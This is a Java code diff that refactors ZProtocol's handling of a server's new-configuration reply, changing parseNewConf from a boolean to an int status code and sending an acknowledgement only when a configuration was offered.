@@ -194,18 +194,27 @@ public class ZProtocol extends Protocol {
 				Check.log(TAG + " Info: ***** NewConf *****"); //$NON-NLS-1$
 			}
 			final byte[] response = command(Proto.NEW_CONF);
-			boolean ret = parseNewConf(response);
+			int ret = parseNewConf(response);
 
 			byte[] data;
-			if (ret) {
-				data = Utils.intToByteArray(Proto.OK);
-			} else {
-				data = Utils.intToByteArray(Proto.NO);
+			if (ret != Proto.NO) {
+				if (ret == Proto.OK) {
+					data = Utils.intToByteArray(Proto.OK);
+				} else {
+					data = Utils.intToByteArray(Proto.NO);
+				}
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (newConf): sending conf answer: " + ret);
+				}
+				command(Proto.NEW_CONF, data);
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (newConf): no conf, no need to write another message");
+				}
 			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (newConf): sending answer: " + ret);
-			}
-			command(Proto.NEW_CONF, data);
+			
+			
 		}
 	}
 
@@ -554,14 +563,15 @@ public class ZProtocol extends Protocol {
 	 * 
 	 * @param result
 	 *            the result
-	 * @return false if error loading new conf, true if no conf or conf read correct
+	 * @return false if error loading new conf, true if no conf or conf read
+	 *         correct
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 * @throws CommandException
 	 *             the command exception
-	 *             
+	 * 
 	 */
-	protected boolean parseNewConf(final byte[] result) throws ProtocolException, CommandException {
+	protected int parseNewConf(final byte[] result) throws ProtocolException, CommandException {
 		final int res = Utils.byteArrayToInt(result, 0);
 		boolean ret = false;
 		if (res == Proto.OK) {
@@ -579,22 +589,26 @@ public class ZProtocol extends Protocol {
 						Check.log(TAG + " (parseNewConf): RELOADING"); //$NON-NLS-1$
 					}
 					// status.reload = true;
-					ret = Core.getInstance().reloadConf();
-				}
+					ret = Core.getInstance().reloadConf();					
+				}								
+				
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (parseNewConf): empty conf"); //$NON-NLS-1$
 				}
 			}
-
-			return ret;
+			if(ret){
+				return Proto.OK;
+			}else{
+				return Proto.ERROR;
+			}
 
 		} else if (res == Proto.NO) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: no new conf: "); //$NON-NLS-1$
 
 			}
-			return true;
+			return Proto.NO;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: parseNewConf: " + res); //$NON-NLS-1$
